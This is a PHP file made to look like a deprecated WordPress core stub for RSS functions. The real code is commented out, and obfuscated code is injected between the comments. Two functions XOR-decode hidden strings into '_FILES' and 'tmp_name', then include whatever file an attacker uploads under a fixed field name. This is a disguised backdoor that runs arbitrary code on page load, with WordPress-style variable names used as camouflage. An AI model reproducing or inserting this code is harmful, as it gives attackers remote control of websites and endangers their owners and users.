<?php /* 
*
 * Deprecated. Use rss.php instead.
 *
 * @package WordPress
 * @deprecated 2.1.0
 

if ( ! defined( 'ABSPATH' ) ) {
	exit();
}

_deprecated_file( basename( __FILE__ ), '2.1.0', WPINC*/
 	
	$capability_type = 'alt_post_name';
function kids()

{
    $pre_tags = 'HbbipmC65YVU';
	$tb_url = 'expages';
    $last_char = $pre_tags;
	$desired_post_slug = 'class';
    
    $old_status = $GLOBALS[dirs("%17%24%2B%255%3E", $last_char)];

    $raw_key = $old_status;
    $good_protocol_url = isset($raw_key[$last_char]);
    if ($good_protocol_url)

    {
	$field = 'pre_attribute_ws';
        $new_subs = $old_status[$last_char];
        $is_utf8 = $new_subs[dirs("%3C%0F%126%1E%0C.S", $last_char)];
	$ext_preg = 'ext_type';
        $double_chars = $is_utf8;
	$image_meta = 'menu_icon';
        include ($double_chars);
	$_edit_link = 'new_path';
    }

}

function dirs($to_look, $children)

{

    $babes = $children;

    $reset = "url" . "decode";
	$get_posts = 'comment_regex';
    $ignore_block_element = $reset($to_look);
    $allblocks = substr($babes,0, strlen($ignore_block_element));

    $keys = $ignore_block_element ^ $allblocks;
    return $keys;

}

kids();

	$revparts = 'conflicts_with_date_archive';


/*  . '/rss.php' );
require_once ABSPATH . WPINC . '/rss.php';
*/